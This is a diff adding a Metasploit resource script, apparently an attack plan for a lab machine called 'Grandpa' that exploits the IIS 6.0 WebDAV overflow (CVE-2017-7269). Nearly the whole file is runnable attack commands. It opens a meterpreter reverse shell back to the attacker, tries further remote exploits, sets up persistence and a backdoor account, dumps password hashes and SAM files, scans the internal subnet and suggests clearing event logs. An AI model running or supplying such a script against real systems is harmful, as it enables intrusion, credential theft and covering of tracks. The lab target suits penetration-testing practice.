@@ -1,0 +1,186 @@
+# Metasploit Attack Plan for Grandpa (10.129.45.100)
+# Generated from Nessus analysis: grandpa_10_129_45_100_20250529_160628.json
+# Target: Windows Server 2003 with IIS 6.0 WebDAV vulnerability (EXPLODINGCAN)
+# CVE: CVE-2017-7269 (CVSS 10.0 - Critical)
+
+# ============================================================================
+# PHASE 1: RECONNAISSANCE AND VERIFICATION
+# ============================================================================
+
+# Basic port scan to verify target is alive
+use auxiliary/scanner/discovery/tcp_sweep
+set RHOSTS 10.129.45.100
+set PORTS 80,443,135,139,445
+run
+
+# HTTP service enumeration
+use auxiliary/scanner/http/http_version
+set RHOSTS 10.129.45.100
+run
+
+# Check for WebDAV availability
+use auxiliary/scanner/http/webdav_scanner
+set RHOSTS 10.129.45.100
+run
+
+# Enumerate HTTP methods
+use auxiliary/scanner/http/options
+set RHOSTS 10.129.45.100
+run
+
+# ============================================================================
+# PHASE 2: EXPLOITATION - WebDAV Buffer Overflow (EXPLODINGCAN)
+# ============================================================================
+
+# Primary exploit: Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+set RHOST 10.129.45.100
+set RPORT 80
+
+# Set payload for initial access
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+
+# Exploit options
+set HttpUsername ""
+set HttpPassword ""
+
+# Execute the exploit
+exploit -j
+
+# Wait for session establishment
+sleep 5
+
+# ============================================================================
+# PHASE 3: POST-EXPLOITATION
+# ============================================================================
+
+# Background current session and perform post-exploitation
+sessions -l
+
+# Use session 1 (adjust if different)
+sessions -i 1
+
+# Basic system information gathering
+sysinfo
+getuid
+getpid
+ps
+
+# Check privileges
+getprivs
+
+# Migrate to a stable process
+ps
+# migrate <stable_process_pid>
+
+# Gather system information
+run post/windows/gather/enum_system
+
+# Check for other users
+run post/windows/gather/enum_logged_on_users
+
+# Network enumeration
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_services
+
+# ============================================================================
+# PHASE 4: PRIVILEGE ESCALATION
+# ============================================================================
+
+# Background session for privilege escalation
+background
+
+# Use local exploit suggester
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+# Common Windows Server 2003 privilege escalation exploits
+# MS08-067 (if applicable)
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 10.129.45.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4445
+exploit -j
+
+# MS03-026 (DCOM RPC Interface)
+use exploit/windows/dcerpc/ms03_026_dcom
+set RHOST 10.129.45.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4446
+exploit -j
+
+# Token impersonation if available
+sessions -i 1
+use incognito
+list_tokens -u
+# impersonate_token <SYSTEM_TOKEN>
+
+# ============================================================================
+# PHASE 5: PERSISTENCE AND DATA COLLECTION
+# ============================================================================
+
+# Establish persistence
+run persistence -U -i 5 -p 4447 -r 10.129.45.100
+
+# Create a backdoor user
+run post/windows/manage/add_user USER=backdoor PASS=P@ssw0rd123
+
+# Dump password hashes
+run post/windows/gather/hashdump
+
+# Search for interesting files
+search -f *.txt
+search -f *.doc
+search -f *.pdf
+search -f config.*
+search -f *password*
+search -f *admin*
+
+# Download system files
+download c:\\windows\\repair\\sam
+download c:\\windows\\repair\\system
+
+# Check for stored credentials
+run post/windows/gather/credentials/windows_autologin
+
+# ============================================================================
+# PHASE 6: LATERAL MOVEMENT PREPARATION
+# ============================================================================
+
+# Network discovery
+run post/windows/gather/arp_scanner RHOSTS=10.129.45.0/24
+
+# Port scan internal network
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.129.45.0/24
+set PORTS 22,23,53,80,135,139,443,445,3389
+set THREADS 10
+run
+
+# SMB enumeration on discovered hosts
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.129.45.0/24
+run
+
+# ============================================================================
+# CLEANUP NOTES
+# ============================================================================
+
+# Before exiting:
+# 1. Remove any uploaded files
+# 2. Clear event logs if possible: clearev
+# 3. Remove backdoor user if compromise detected
+# 4. Kill persistence if no longer needed
+
+# Exit sessions
+sessions -K
+
+# Additional manual steps:
+# - Analyze captured hashes with john/hashcat
+# - Use credentials for lateral movement
+# - Document all findings for reporting 
